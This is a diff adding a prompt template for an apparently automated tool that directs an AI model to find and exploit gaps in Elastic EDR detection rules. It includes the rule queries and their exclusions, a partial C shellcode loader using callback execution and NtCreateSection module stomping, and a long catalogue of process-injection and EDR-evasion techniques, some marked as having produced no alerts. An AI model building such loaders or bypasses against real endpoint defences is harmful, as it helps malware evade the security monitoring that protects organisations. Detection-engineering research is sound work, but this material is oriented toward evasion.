@@ -1,0 +1,465 @@
+# EDR Rule Gap Analysis
+
+## Context
+We are analyzing EDR detection rules to identify logical gaps and design improvements.
+A test executable triggered alerts or failed validation. We need to understand each rule's logic, identify exceptions/exclusions, and propose precision improvements.
+
+## Memory & History
+### Iteration History
+Iter 1: [outcome=detected]
+Technique: unknown_approach (Standard implementation)
+Triggered Rules: Malicious Behavior Detection Alert: Process Creation from Unbacked Memory via Unsigned Parent, Process Creation from Unbacked Memory via Unsigned Parent, Potential Process Creation via ShellCode
+Analysis: Pending AI Analysis
+
+Iter 2: [outcome=detected]
+Technique: module_stomping (Standard implementation)
+Triggered Rules: Process Creation from Unbacked Memory via Unsigned Parent, Potential Process Creation via ShellCode
+Analysis: Pending AI Analysis
+
+### Rule Analysis
+
+    Solved Rules: Malicious Behavior Detection Alert: Process Creation from Unbacked Memory via Unsigned Parent
+    Persistent Rules: Process Creation from Unbacked Memory via Unsigned Parent(x2), Potential Process Creation via ShellCode(x2)
+    Active Rules Details:
+    - Rule: Process Creation from Unbacked Memory via Unsigned Parent | APIs: process.parent.executable, process.parent.thread.Ext.call_stack_summary, process.parent.thread.Ext.call_stack_contains_unbacked, process.executable | Logic: sequence by user.id with maxspan=3m
+ [process where event.action == "start" and not user.id : "S-1-5-18" and
+  (process.Ext.relative_file_creation_time <= 500 or process.Ext.relative_file_name_modify_time <= 500) and
+  not process.code_signature.status : ("trusted", "errorExpired", "errorCode_endpoint*") and
+  not process.executable : ("C:\\Program Files\\Cognex\\ALI\\Cognex.VisionSolutions.ServiceHost.exe",
+                            "C:\\Program Files (x86)\\PatientWorks\\Bin\\PWPatientXpress.exe",
+                            "C:\\Program Files (x86)\\Enrollment\\WebEnrollment\\Server\\bin\\JobEngineService.exe") and
+  process.pe.imphash != "f34d5f2d4577ed6d9ceec516c1f5a744" and
+  not process.parent.executable : "C:\\Program Files\\Microsoft Visual Studio\\*\\Common?\\IDE\\devenv.exe"
+  ] by process.entity_id as event0
+ [process where event.action == "start" and
+  process.parent.thread.Ext.call_stack_contains_unbacked == true and
+  process.parent.thread.Ext.call_stack_summary :
+                           ("ntdll.dll|kernelbase.dll|kernel32.dll|Unbacked",
+                            "ntdll.dll|kernelbase.dll|Unbacked",
+                            "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked",
+                            "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|windows.storage.dll|shell32.dll|Unbacked",
+                            "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked|kernel32.dll|ntdll.dll",
+                            "*mscorlib.ni.dll|microsoft.visualbasic.ni.dll|Unbacked*") and
+(
+ process.executable : "?:\\Windows\\Microsoft.NET\\Framework*" or
+ (process.executable regex~ """(c:\\windows\\system32\\[a-z0-9\-\_\.]+\.exe|c:\\windows\\syswow64\\[a-z0-9\-\_\.]+\.exe|c:\\windows\\[a-z0-9\-\_\.]+\.exe)""" and process.args_count <= 1) or
+ event0.process.hash.sha256 == process.hash.sha256
+)
+] by process.parent.entity_id
+
+- Rule: Potential Process Creation via ShellCode | APIs: process.parent.thread.Ext.call_stack_contains_unbacked, process.parent.thread.Ext.call_stack, process.parent.thread.Ext.call_stack_summary, process.parent.executable, WinExec, process.executable | Logic: process where event.action == "start" and
+
+process.parent.thread.Ext.call_stack_contains_unbacked == true and
+
+ (process.parent.thread.Ext.call_stack_summary : "*kernel32.dll|Unbacked*" and
+  _arraysearch(process.parent.thread.Ext.call_stack, $entry, $entry.symbol_info : "*kernel32.dll!WinExec*")) and
+
+not (process.code_signature.trusted == true and
+     process.code_signature.subject_name : ("GIGA-BYTE TECHNOLOGY CO., LTD.", "Intuit Inc", "Ramsauer und Stuermer Software GmbH",
+     "Aptean, Inc.", "MICRO-STAR INTERNATIONAL CO., LTD.")) and
+
+not (process.executable : "C:\\Windows\\System32\\sc.exe" and process.parent.executable : "C:\\Windows\\System32\\svchost.exe" and
+     process.command_line : "sc start LenovoPcManagerService") and
+not process.executable :
+                ("C:\\Program Files (x86)\\Ponds33\\Refined Method\\Main.exe",
+                 "C:\\Program Files (x86)\\Ponds33\\Underdrain\\UDMain.exe",
+                 "C:\\Program Files (x86)\\Ponds33\\NPCalc\\NPCalcMain.exe")
+
+
+    
+
+### Active Approach Status
+unknown_approach: 1/3 attempts (target: Malicious Behavior Detection Alert: Process Creation from Unbacked Memory via Unsigned Parent)
+module_stomping: 1/3 attempts (target: Process Creation from Unbacked Memory via Unsigned Parent)
+
+### Banned Approaches (Do NOT attempt these)
+None
+
+
+    ## Previous Test Results
+    Iteration: 2
+    Status: detected
+    Exit Code: 0
+    Output Snippet: [+] loaded 276 bytes from C:\Users\mslr74l\Desktop\dev\behaviorBypassAgent\tests\calc.bin
+
+    Error Snippet: [-] NtCreateSection(SEC_IMAGE) failed: 0xC0000022
+
+    Compile Success: True
+    Previous Strategy Plan:
+    # EDR Rule Gap Analysis — Iteration 1
+
+## Executive Summary of the Failure
+
+Before analyzing rules, the crash itself is informative: **exit code 0xC0000005 (ACCESS_VIOLATION)** occurred *after* the `[+] dispatching payload via EnumSystemLocalesEx` print. The loader's dispatch mechanism was structurally fine — the payload was reached — but the execution model was wrong for the monitored indicators:
+
+- The payload ran from a **private, unbacked RW→RX page** (`VirtualAlloc` + `VirtualProtect`). Ela
+
+    ## Previous Code (C source that was tested)
+    ```c
+    /*
+ * x64 shellcode loader - Iteration 2
+ *
+ * Technique: threadless_injection (EnumSystemLocalesEx callback)
+ *            composed with module_stomping_section_mapping
+ *            (NtCreateSection(SEC_IMAGE) + NtMapViewOfSection of a
+ *             signed System32 DLL; payload written into its .text).
+ *
+ * Why: all three Elastic rules from Iter 1 depend on
+ *      process.parent.thread.Ext.call_stack_contains_unbacked == true.
+ *      Executing from a private VirtualAlloc page makes that flag true.
+ *      Executing from an image-backed mapped section makes it false.
+ *
+ * Build (MSVC x64):
+ *   cl /nologo /O2 /GS- loader_threadless_injection_2.c
+ *
+ * Usage:
+ *   loader_threadless_injection_2.exe C:\path\to\calc.bin
+ */
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+
+/* ------------------------------------------------------------------ */
+/* Minimal NT API declarations (winternl.h does not define these)      */
+/* ------------------------------------------------------------------ */
+
+typedef LONG NTSTATUS;
+#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
+
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#endif
+
+typedef enum _SECTION_INHERIT {
+    ViewShare = 1,
+    ViewUnmap = 2
+} SECTION_INHERIT;
+
+/* NTSTATUS NtCreateSection(...) */
+typedef NTSTATUS (NTAPI *pNtCreateSection)(
+    PHANDLE            SectionHandle,
+    ACCESS_MASK        DesiredAccess,
+    PVOID              ObjectAttributes,   /* POBJECT_ATTRIBUTES */
+    PLARGE_INTEGER     MaximumSize,
+    ULONG              SectionPageProtection,
+    ULONG              AllocationAttributes,
+    HANDLE             FileHandle
+);
+
+/* NTSTATUS NtMapViewOfSection(...) */
+typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
+    HANDLE          SectionHandle,
+    HANDLE          ProcessHandle,
+    PVOID          *BaseAddress,
+    ULONG_PTR       ZeroBits,
+    SIZE_T          CommitSize,
+    PLARGE_INTEGER  SectionOffset,
+    PSIZE_T         ViewSize,
+    SECTION_INHERIT InheritDisposition,
+    ULONG           AllocationType,
+    ULONG           Win32Protect
+);
+
+/* NTSTATUS NtClose(HANDLE) */
+typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);
+
+/* ------------------------------------------------------------------ */
+/* Callback prototype for EnumSystemLocalesEx                          */
+/* ------------------------------------------------------------------ */
+typedef BOOL (CALLBACK *LOCALE_ENUMPROCEX)(LPWSTR, DWORD, LPARAM);
+
+/* ------------------------------------------------------------------ */
+/* One-shot guard: shellcode is executed only on the first callback.   */
+/* ------------------------------------------------------------------ */
+static volatile LONG g_done = 0;
+
+/*
+ * We pass the payload address via lParam so the callback can be a
+ * normal function (not the payload itself). This is safer than
+ * pointing the callback directly at the payload because:
+ *   - the payload's return value is undefined;
+ *   - EnumSystemLocalesEx may invoke the callback more than once.
+ *
+ * The callback calls into the payload via a function pointer with the
+ * x64 Windows ABI. The payload sees a normal call frame; the OS has
+ * already ensured 16-byte stack alignment at the callback entry.
+ */
+typedef void (*PAYLOAD_FN)(void);
+
+static BOOL CALLBACK locale_enum_proc(LPWSTR lpLocaleString, DWORD dwFlags, LPARAM lParam)
+{
+    PAYLOAD_FN fn;
+
+    (void)lpLocaleString;
+    (void)dwFlags;
+
+    /* Atomic one-shot: only the first invocation runs the payload. */
+    if (InterlockedCompareExchange(&g_done, 1, 0) != 0) {
+        return FALSE;   /* stop enumeration */
+    }
+
+    fn = (PAYLOAD_FN)lParam;
+    if (fn != NULL) {
+        fn();
+    }
+
+    /* If the payload returned, stop enumerating further locales. */
+    return FALSE;
+}
+
+/* ------------------------------------------------------------------ */
+/* Read the whole file into a heap buffer. Caller frees.               */
+/* ------------------------------------------------------------------ */
+static unsigned char *read_file(const char *path, size_t *out_size)
+{
+    FILE *fp = NULL;
+    long  sz = 0;
+    unsigned char *buf = NULL;
+    size_t got = 0;
+
+    if (path == NULL || out_size == NULL) {
+        return NULL;
+    }
+
+    fp = fopen(path, "rb");
+    if (fp == NULL) {
+        fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n", path, errno);
+        fflush(stderr);
+        return NULL;
+    }
+
+    if (fseek(fp, 0, SEEK_END) != 0) {
+        fclose(fp);
+        return NULL;
+    }
+    sz = ftell(fp);
+    if (sz <= 0) {
+        fclose(fp);
+        fprintf(stderr, "[-] empty or unreadable file\n");
+        fflush(stderr);
+        return NULL;
+    }
+    if (fseek(fp, 0, SEEK_SET) != 0) {
+        fclose(fp);
+        return NULL;
+    }
+
+    buf = (unsigned char *)malloc((size_t)sz);
+    if (buf == NULL) {
+        fclose(fp);
+        return NULL;
+    }
+
+    got = fread(buf, 1, (size_t)sz, fp);
+    fclose(fp);
+
+    if (got != (size_t)sz) {
+        fprintf(stderr, "[-] short read (%zu
+
+... (code truncated for length)
+    ```
+    
+
+## Detection Details
+### Alert 1: Process Creation from Unbacked Memory via Unsigned Parent
+- Detector: elastic_local_log
+- Severity: high
+- Rule ID: 5eb295bd-38d5-48b0-9753-47e1651cef1b
+- Process: loader_threadless_injection_2.exe (pid=None)
+- File: C:\Users\mslr74l\Desktop\dev\behaviorBypassAgent\output\20260929_224157_threadless_injection\iter_2\loader_threadless_injection_2.exe
+- Description: None
+- **Matched local rule**:
+    - Name: Process Creation from Unbacked Memory via Unsigned Parent
+    - File: defense_evasion_process_creation_from_unbacked_memory_via_unsigned_parent.toml
+    - Rule ID: 5eb295bd-38d5-48b0-9753-47e1651cef1b
+    - Detection query:
+        sequence by user.id with maxspan=3m
+         [process where event.action == "start" and not user.id : "S-1-5-18" and
+          (process.Ext.relative_file_creation_time <= 500 or process.Ext.relative_file_name_modify_time <= 500) and
+          not process.code_signature.status : ("trusted", "errorExpired", "errorCode_endpoint*") and
+          not process.executable : ("C:\\Program Files\\Cognex\\ALI\\Cognex.VisionSolutions.ServiceHost.exe",
+                                    "C:\\Program Files (x86)\\PatientWorks\\Bin\\PWPatientXpress.exe",
+                                    "C:\\Program Files (x86)\\Enrollment\\WebEnrollment\\Server\\bin\\JobEngineService.exe") and
+          process.pe.imphash != "f34d5f2d4577ed6d9ceec516c1f5a744" and
+          not process.parent.executable : "C:\\Program Files\\Microsoft Visual Studio\\*\\Common?\\IDE\\devenv.exe"
+          ] by process.entity_id as event0
+         [process where event.action == "start" and
+          process.parent.thread.Ext.call_stack_contains_unbacked == true and
+          process.parent.thread.Ext.call_stack_summary :
+                                   ("ntdll.dll|kernelbase.dll|kernel32.dll|Unbacked",
+                                    "ntdll.dll|kernelbase.dll|Unbacked",
+                                    "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked",
+                                    "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|windows.storage.dll|shell32.dll|Unbacked",
+                                    "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked|kernel32.dll|ntdll.dll",
+                                    "*mscorlib.ni.dll|microsoft.visualbasic.ni.dll|Unbacked*") and
+        (
+         process.executable : "?:\\Windows\\Microsoft.NET\\Framework*" or
+         (process.executable regex~ """(c:\\windows\\system32\\[a-z0-9\-\_\.]+\.exe|c:\\windows\\syswow64\\[a-z0-9\-\_\.]+\.exe|c:\\windows\\[a-z0-9\-\_\.]+\.exe)""" and process.args_count <= 1) or
+         event0.process.hash.sha256 == process.hash.sha256
+        )
+        ] by process.parent.entity_id
+    - Parsed detection patterns:
+    - API/Behavior indicators: process.parent.executable, process.parent.thread.Ext.call_stack_summary, process.parent.thread.Ext.call_stack_contains_unbacked, process.executable
+    - File paths: C:\\Program Files\\Cognex\\ALI\\Cognex.VisionSolutions.ServiceHost.exe, C:\\Program Files (x86)\\PatientWorks\\Bin\\PWPatientXpress.exe, C:\\Program Files (x86)\\Enrollment\\WebEnrollment\\Server\\bin\\JobEngineService.exe, C:\\Program Files\\Microsoft Visual Studio\\*\\Common?\\IDE\\devenv.exe, ?:\\Windows\\Microsoft.NET\\Framework*
+    - Process names: ?:\\Windows\\Microsoft.NET\\Framework*
+    - Behavior keywords: unbacked, code_signature, relative_file_creation_time
+    - Exclusions/allowlists: (
+
+### Alert 2: Potential Process Creation via ShellCode
+- Detector: elastic_local_log
+- Severity: high
+- Rule ID: 58b996a5-634c-4205-9ffa-a6f2b8ebc1ad
+- Process: loader_threadless_injection_2.exe (pid=None)
+- File: C:\Users\mslr74l\Desktop\dev\behaviorBypassAgent\output\20260929_224157_threadless_injection\iter_2\loader_threadless_injection_2.exe
+- Description: None
+- **Matched local rule**:
+    - Name: Potential Process Creation via ShellCode
+    - File: defense_evasion_potential_process_creation_via_shellcode.toml
+    - Rule ID: 58b996a5-634c-4205-9ffa-a6f2b8ebc1ad
+    - Detection query:
+        process where event.action == "start" and
+        
+        process.parent.thread.Ext.call_stack_contains_unbacked == true and
+        
+         (process.parent.thread.Ext.call_stack_summary : "*kernel32.dll|Unbacked*" and
+          _arraysearch(process.parent.thread.Ext.call_stack, $entry, $entry.symbol_info : "*kernel32.dll!WinExec*")) and
+        
+        not (process.code_signature.trusted == true and
+             process.code_signature.subject_name : ("GIGA-BYTE TECHNOLOGY CO., LTD.", "Intuit Inc", "Ramsauer und Stuermer Software GmbH",
+             "Aptean, Inc.", "MICRO-STAR INTERNATIONAL CO., LTD.")) and
+        
+        not (process.executable : "C:\\Windows\\System32\\sc.exe" and process.parent.executable : "C:\\Windows\\System32\\svchost.exe" and
+             process.command_line : "sc start LenovoPcManagerService") and
+        not process.executable :
+                        ("C:\\Program Files (x86)\\Ponds33\\Refined Method\\Main.exe",
+                         "C:\\Program Files (x86)\\Ponds33\\Underdrain\\UDMain.exe",
+                         "C:\\Program Files (x86)\\Ponds33\\NPCalc\\NPCalcMain.exe")
+    - Parsed detection patterns:
+    - API/Behavior indicators: process.parent.thread.Ext.call_stack_contains_unbacked, process.parent.thread.Ext.call_stack, process.parent.thread.Ext.call_stack_summary, process.parent.executable, WinExec, process.executable
+    - File paths: C:\\Windows\\System32\\sc.exe, C:\\Windows\\System32\\svchost.exe, C:\\Program Files (x86)\\Ponds33\\Refined Method\\Main.exe, C:\\Program Files (x86)\\Ponds33\\Underdrain\\UDMain.exe, C:\\Program Files (x86)\\Ponds33\\NPCalc\\NPCalcMain.exe
+    - Process names: C:\\Windows\\System32\\sc.exe
+    - Behavior keywords: unbacked, code_signature
+    - Exclusions/allowlists: (
+
+## Task
+1. **Analyze** the execution failure or detection alert using the provided telemetry
+2. **Per-Rule Analysis**: For EACH triggered detection rule (or previously triggered rule), perform individual gap analysis:
+- Identify the rule's detection logic and scope
+- **Priority 1**: Examine the rule's exclusion/exception conditions (check "Active Rules Details" if available)
+- **Priority 2**: Find gaps in the current technique's implementation that could bypass this specific rule
+- **Priority 3**: If no gap exists within the current technique, propose alternative approaches
+3. **Design** next validation strategy focusing on rule gaps, NOT just evasion
+
+## Exclusion Strategy Constraints
+When analyzing Known_Exclusions, adhere to these rules:
+- **Ignore `process.executable`**: The loader's filename and filepath cannot be modified, so do not propose exclusions based on them.
+- **Ignore `code_signature`**: Signatures cannot be applied, so do not propose exclusions based on trusted signers.
+- **Notable Exclusions**: **Stack-based** (e.g., call stack modules) and **API-based** exclusions.
+
+## Example of Analysis Logic
+When analyzing a detection rule, identify conditions that can be neutralized by altering specific parameters. For instance:
+
+- **Regex Constraints**: If a rule filters `process.Ext.api.metadata.target_address_path` with a regex like `c:\\windows\\(system32|syswow64)\\[a-z]+.dll`, using a DLL from a different directory (e.g., `C:\\Program Files\\...`) would serve as a bypass technique.
+
+- **Allowlists**: If there is an exclusion list (`NOT LIKE`) for specific paths such as:
+  - `c:\\windows\\assembly\\nativeimages_*.dll`
+  - `c:\\program files\\*`
+  The detection can be evaded by ensuring the `call_stack` (e.g., via call stack spoofing or API proxying) or module path (e.g., Module Stomping a DLL loaded from that allowed path) aligns with these allowed paths.
+
+**Requirements for Prompt Construction:**
+Generalization: Do not fixate only on the examples provided above. The model should flexibly identify "Allowlists" or "Excluded Conditions" within any given rule and prioritize satisfying those exclusions.
+
+## Standard Testing Methodologies
+- **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
+    - **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions.
+    - **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory.
+    - **module_stomping_section_mapping**: Module Stomping via NtCreateSection(SEC_IMAGE)+NtMapViewOfSection. Maps the sacrificial DLL as an image section (file-backed, RX) without a LoadLibrary event; shellcode overwrites the mapped .text in place. Keeps the module off the PEB loader list and makes call-stack module resolution point at a legitimate DLL path.
+    - **module_stomping_fiber**: Module Stomping + Fiber: stomp a mapped image section, then start execution via CreateFiber/SwitchToFiber so no thread-creation telemetry is emitted. Workshop-verified combination that produced no Elastic alerts.
+    - **thread_hijacking_local**: Thread Hijacking (local): suspend an existing thread in the own process (e.g. created earlier or via CreateThread on a decoy), overwrite its RIP with the payload address via SetThreadContext, resume. Avoids a fresh thread-start pointing at unbacked memory.
+    - **apc_injection**: APC execution (self-injection): QueueUserAPC/NtQueueApcThread the payload address onto an alertable thread in the same process, then enter an alertable wait (SleepEx/WaitForSingleObjectEx). No new thread is created.
+    - **threadless_injection** [USER-PREFERRED]: Threadless Injection (local variant): patch an existing function in a loaded module (or an unused callback slot, e.g. window proc) so the payload runs on a normal call path instead of a new thread. Pure-C feasible when targeting the own process; remote-process variants need handle ops and widen the detection surface.
+    - **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR.
+    - **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context.
+    - **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion.
+    - **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory).
+    - **dll_side_loading**: DLL side-loading: drop a payload-bearing DLL next to a signed binary that imports it, so execution flows under a trusted image name.
+    - **mockingjay**: Mockingjay: reuse an existing PAGE_EXECUTE_READWRITE section inside a signed DLL (e.g. msys-2.0.dll) — no VirtualAlloc/VirtualProtect at all; writes land in image-backed executable memory.
+    - **early_bird_apc**: Early Bird APC: spawn a signed host process suspended and queue an APC before its first thread runs, so the payload executes during process init — potentially before userland EDR hooks install.
+    - **ntdll_unhooking**: NTDLL unhooking: restore ntdll .text bytes from KnownDlls or a clean on-disk copy to remove inline EDR hooks before running the payload. Auxiliary step — combine with a staging technique.
+    - **direct_syscall**: Direct/indirect syscalls (HellsGate-style): resolve SSNs from ntdll stubs and invoke the kernel without passing through hooked ntdll prologues. Does not affect kernel-level telemetry.
+    - **process_hollowing_remote**: Remote process hollowing (classic T1055): CreateProcess suspended, NtUnmapViewOfSection the original image, write replacement code, redirect entry, resume. Baseline to measure Elastic hollowing-rule coverage.
+    - **proxy_function_calls**: Execute sensitive APIs (NtCreateThread, etc.) through 'gadgets' in legitimate DLLs like ntdll.dll or kernel32.dll to evade return address filtering.
+    - **process_doppelganging**: Create file transaction, write shellcode, rollback transaction but keep section handle. Execute from transacted memory.
+    - **callback_execution**: Use legitimate callback functions (EnumWindows, EnumSystemLocales, etc.) with shellcode address.
+    - **module_overloading**: Map same DLL twice - once legitimate, once modified. Use legitimate handle for cover.
+    - **atom_bombing**: Atom bombing: store shellcode in the global atom table, then NtQueueApcThread a GlobalGetAtomNameW call into a target thread so the atom content is written inside the target process — no WriteProcessMemory.
+    - **tls_callback**: TLS callback execution: register a PIMAGE_TLS_CALLBACK in the .CRT$XL* section so the payload runs inside LdrpCallTlsInitializers before main — no thread/APC creation.
+    - **propagate**: PROPagate: store payload/subclass header in a target window's property list and trigger it via window messages — injection through the windowing subsystem, not process APIs.
+    - **process_ghosting**: Process ghosting: create a file, mark delete-pending, write a payload PE, build a SEC_IMAGE section from the delete-pending handle, then close — a process whose image has no on-disk file at all.
+    - **windows_hook_injection**: SetWindowsHookEx injection: the OS itself loads our hook DLL into a target GUI process when it pumps messages — no remote alloc/write APIs involved.
+    - **context_gadget**: SetThreadContext + gadget: redirect a thread's RIP into a jmp/call gadget inside a signed module so the first stack frame is module-backed even though control reaches the payload next.
+    - **exception_dispatch_exec**: Exception-dispatched execution: a VEH handler rewrites ContextRecord->Rip to the payload and returns CONTINUE_EXECUTION — control transfer happens inside KiUserExceptionDispatcher.
+    - **remote_section_mapping**: Remote section mapping: write payload in our own view of a section object, then NtMapViewOfSection the same section into the target — no VirtualAllocEx/WriteProcessMemory pair.
+    - **rundll32_hosting**: Signed host execution: drop a payload DLL and run it under rundll32/regsvr32 — the hosting process is a signed system binary, which may break unsigned-parent rule sequences.
+    - **suspended_section_exec**: Suspended-process section write: spawn signed host suspended, NtMapViewOfSection a payload section into it, redirect the main thread — hollowing-style exec without the loud NtUnmapViewOfSection call.
+    - **scattered_allocation**: Split shellcode across multiple small allocations. Reconstruct at runtime. Evades signature scanning.
+    - **read_only_trick**: Allocate as PAGE_READONLY, use hardware breakpoint or exception handler to execute. Very stealthy.
+    - **inherited_section_apc**: Inherited-Handle Section APC: pass a payload-carrying section into a suspended child via PROC_THREAD_ATTRIBUTE_HANDLE_LIST so the kernel duplicates the handle at process creation — no VirtualAllocEx/WriteProcessMemory/remote-map event exists. The child maps the section locally; trigger via early-bird APC or gadget/context redirect. Project-original composition.
+    - **self_reflection_exec**: Self-Reflection Execution: RtlCreateProcessReflection/RtlCloneUserProcess forks our own process after local staging — the payload is inherited at birth (COW), so no remote alloc/write/map call exists at all. StartRoutine option runs the payload inside the clone without a CreateThread-named call.
+    - **api_surface_translation**: API Surface Translation (meta): substitute every fingerprinted Win32 call with a documented modern twin (VirtualAlloc2, MapViewOfFile3, NtMapViewOfSectionEx, VirtualProtectFromApp, CreateFile2, NtCreateThreadEx flags, placeholder APIs) — tests whether rules match api.name strings. Applied on top of other techniques; one-iteration test per rule family.
+
+    ### USER PREFERRED TECHNIQUES (Prioritize these!)
+    - **threadless_injection**
+
+
+## Techniques Knowledge Base
+Curated implementation notes for the enabled/preferred techniques. Prefer these concrete patterns over generic code.
+### threadless_injection [USER-PREFERRED]
+# Threadless Injection (function hooking / callback hijack)
+
+## Goal
+Execute shellcode without creating any thread at all — patch a function body or a callback slot that gets invoked on a normal call path.
+
+## Local-process variants (single-exe feasible)
+- **Callback slot overwrite**: replace a function pointer our own process already calls — e.g. a window proc (`SetWindowLongPtr(GWLP_WNDPROC)`), a registered `atexit` handler, or a message hook invoked via the message loop.
+- **IAT patch**: overwrite an imported-function entry in our own module's IAT (e.g. patch `GetSystemTime`'s slot) then call it — the call goes to the payload.
+- **Enum/callback execution**: APIs that invoke a callback synchronously (`EnumWindows`, `EnumDesktopWindows`, `EnumSystemLocalesEx`, `EnumDateFormatsExEx`, `CertEnumSystemStore`) with the payload address as the callback — simplest "threadless" execution of all.
+
+## Remote variant (documented, not recommended for this pipeline)
+Patching a function inside a *victim* process requires `OpenProcess` + `VirtualProtectEx` + `WriteProcessMemory` + trigger — every one of those is instrumented. Only useful with strong call-stack hygiene already in place.
+
+## Detection surface (Elastic)
+- `VirtualProtect` on a module's `.text`/IAT region and writes into image sections are watched — combine with stomping discipline.
+- Exotic callback APIs are rule-catalogued one by one; common `Enum*` calls with a callback pointer into a file-backed (stomped) region are the lowest-noise option.
+
+## Pitfalls
+- Payload signature must match the patched callback's calling convention — mismatched prototypes crash after execution.
+- Overwriting WNDPROC/IAT needs the write to happen while no other thread uses the slot; for own-process loaders, do it before starting the message loop.
+
+
+    ## Language Specific Constraints
+    - Emit one complete compilable translation unit including ALL required headers; no stubs, TODOs, or pseudocode. Verify braces balance before finishing the file.
+    - Use `int main(int argc, char* argv[])` and read the payload path from argv[1]. If you choose wmain/wWinMain (wide args), you MUST use wide CRT functions (_wfopen, wcslen, wprintf); passing wchar_t* argv to narrow functions like fopen/printf %s reads garbage such as just "C".
+    - The target is x64 Windows and the code must compile cleanly under MSVC cl.exe. Do not use GCC-only extensions (e.g. __attribute__) and do not use C++ constructs.
+    - Prefer documented Win32 APIs from <windows.h>. If undocumented NT APIs (Nt*/Zw*/Rtl* functions or types like OBJECT_ATTRIBUTES/IO_STATUS_BLOCK) are required, you MUST declare every typedef, enum, and function prototype yourself; <winternl.h> alone does NOT define most of them.
+    - Keep helper declarations above their call sites and ensure every identifier used is declared; cl.exe does not tolerate forward references to undeclared functions.
+    - The loader's only job is executing the payload bytes from argv[1]; never spawn or search for the observable target process (calc.exe/CalculatorApp.exe) yourself — the payload produces it. If a technique needs a host process, spawn a real executable (e.g. C:\Windows\System32\notepad.exe), NOT a UWP alias like CalculatorApp.exe which cannot be CreateProcess'd (error 2).
+
+## Output Format
+For Rule: [Rule Name 1]
+
+- **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+- **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+- **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+- **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+For Rule: [Rule Name 1]
+
+- **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+- **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+- **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+- **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+[Repeat for each triggered rule]
